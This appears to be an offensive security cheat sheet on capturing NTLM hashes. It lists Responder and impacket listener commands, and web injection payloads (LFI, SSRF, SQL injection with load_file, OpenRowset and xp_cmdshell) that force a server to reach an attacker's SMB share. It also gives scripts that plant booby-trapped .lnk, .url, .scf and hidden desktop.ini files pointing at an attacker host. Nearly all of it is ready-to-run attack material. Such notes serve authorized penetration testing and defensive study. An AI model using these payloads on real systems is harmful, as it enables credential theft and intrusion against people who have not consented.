---
icon: ear
---

# Capturing NTLM hashes

## Listener

```bash
responder -I <interface>
```

```
impacket-smbserver share /dev/null -smb2support
```

## Possible Attacks

> https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/

### Via web vulnerability

If you discover a web vulnerability (such as LFI, SQLI, XXE, SSRF, SSTI) that allows you to include remote files, you can exploit it to steal the NTLM hash of the user running the process. For example:

<pre class="language-powershell"><code class="lang-powershell"># LFI
?page=\\attaker\test

# SSRF
?url=file://attaker/test

# SQL Injection
?id=1' union select null,load_file('\\\\attaker\\test'),null-- -
  
  ## MSSQL
  ?id=1' union select null,(select x from OpenRowset(BULK '\\attaker\test',SINGLE_CLOB) R(x)),null-- -
<strong>  ?id=1' union select null,(EXEC xp_cmdshell 'dir \\attaker\test'),null-- -
</strong></code></pre>

### Via .lnk file

```powershell
# With powershell
$targetPath = "\\10.10.10.10\test" 
$shortcutPath = "C:\path\to\your\~shortcut.lnk" 
$WScriptShell = New-Object -ComObject WScript.Shell 
$shortcut = $WScriptShell.CreateShortcut($shortcutPath) 
$shortcut.TargetPath = $targetPath 
$shortcut.Save()
```

### Via .url file

```sh
echo '[InternetShortcut]' > ~shortcut.url
echo 'URL=file:////10.10.10.10/test' >> ~shortcut.url
```

### Via .scf file

> Not working on newer Windows versions.

```sh
echo '[Shell]' > ~file.scf
echo 'Command=2' >> ~file.scf
echo 'IconFile=explorer.exe,3' >> ~file.scf
echo '[Taskbar]' >> ~file.scf
echo 'Command=ToggleDesktop' >> ~file.scf
echo '[InternetShortcut]' >> ~file.scf
echo 'URL=file:////10.10.10.10/test' >> ~file.scf
```

### Via desktop.ini file

> Not working on newer Windows versions.

```powershell
# With powershell
echo '[.ShellClassInfo]' > desktop.ini
echo 'IconResource=\\10.10.10.10\test' >> desktop.ini
attrib +s +h desktop.ini
```
